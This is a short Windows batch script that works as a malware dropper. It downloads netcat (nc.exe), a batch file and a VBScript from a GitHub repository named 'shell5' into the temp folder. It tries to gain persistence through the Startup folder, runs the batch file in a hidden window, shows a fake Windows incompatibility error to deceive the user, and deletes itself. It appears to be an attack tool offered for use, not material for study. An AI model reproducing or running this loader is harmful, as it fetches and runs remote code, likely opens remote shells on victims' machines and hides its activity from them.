@echo off
curl https://raw.githubusercontent.com/omarsamyX0/shell5/main/nc.exe -o %temp%\nc.exe
curl https://raw.githubusercontent.com/omarsamyX0/shell5/main/pro.bat -o %temp%\pro.bat
curl https://raw.githubusercontent.com/omarsamyX0/shell5/main/start.vbs -o %temp%\start.vbs
move "%temp%\start.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
powershell -c "Start-Process -FilePath "%temp%\pro.bat" -WindowStyle Hidden"
echo The version of this file is not compatible with the version of Windows you're running. Check your computer's system information to see whether you need an x86 (32-bit) or x64 (64-bit) version of the program ........
timeout /t 3 >nul
del "%~f0"
